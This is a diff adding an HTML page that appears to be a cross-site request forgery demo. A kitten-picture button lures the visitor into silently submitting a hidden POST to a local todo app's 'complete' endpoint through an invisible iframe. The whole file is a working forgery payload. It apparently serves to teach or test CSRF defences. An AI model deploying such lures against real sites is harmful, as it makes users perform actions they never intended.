@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Hey There!</h1>
+    <p
+      >Having a rough day! Don't worry, I have got a picture of a kitten to
+      cheer you up. <button id="btn_cat">Show me 🐱</button>
+    </p>
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form
+      method="POST"
+      action="http://localhost:3000/todos/complete"
+      target="csrf-frame"
+      id="csrf-form"
+    >
+    </form>
+    <script type="text/javascript">
+      document.getElementById('btn_cat').addEventListener('click', () => {
+        document.getElementById('csrf-form').submit();
+      });
+    </script>
+  </body>
+</html>
